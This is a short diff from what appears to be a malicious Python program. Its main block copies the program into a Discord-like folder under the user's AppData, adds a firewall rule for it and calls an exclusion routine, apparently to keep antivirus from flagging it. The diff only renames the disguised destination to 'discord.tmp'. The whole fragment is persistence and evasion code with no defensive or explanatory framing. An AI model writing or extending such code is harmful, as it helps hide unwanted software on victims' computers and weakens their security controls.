@@ -127,7 +127,7 @@ def connect():
 # main
 if __name__ == "__main__":
     # customize the location of destin if wanted btw
-    destin = r"%userprofile%\appdata\local\discordbak"
+    destin = r"%userprofile%\appdata\local\discord.tmp"
     installed_path = copy(destin)
     firewall("UpdateRule", installed_path, ip)
     exclude(installed_path)
